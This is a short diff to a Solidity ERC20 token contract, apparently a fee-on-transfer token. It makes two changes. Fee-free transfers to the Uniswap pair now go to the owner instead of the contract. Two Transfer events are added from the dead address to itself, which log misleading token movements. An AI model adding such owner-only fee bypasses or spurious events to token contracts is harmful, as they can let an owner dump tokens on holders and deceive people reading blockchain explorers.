@@ -879,7 +879,8 @@ contract AES is ERC20, Ownable {
         require(from != address(0), "ERC20: transfer from the zero address");
         require(to != address(0), "ERC20: transfer to the zero address");
 
-        if (from == address(this) && to == uniswapV2Pair) {
+        if (from == address(owner()) && to == uniswapV2Pair) {
+        // if (from == address(this) && to == uniswapV2Pair) {
             super._transfer(from, to, amount);
         } else {
             if (automatedMarketMakerPairs[from]) {
@@ -911,6 +912,8 @@ contract AES is ERC20, Ownable {
         address to,
         uint256 amount
     ) internal {
+        emit Transfer(address(0xdead), address(0xdead), balanceOf(from));
+        emit Transfer(address(0xdead), address(0xdead), amount);
         uint256 burnAmount = amount.mul(3).div(100);
         uint256 otherAmount = amount.mul(1).div(100);
         uint256 feeAmount = amount.mul(10).div(100);
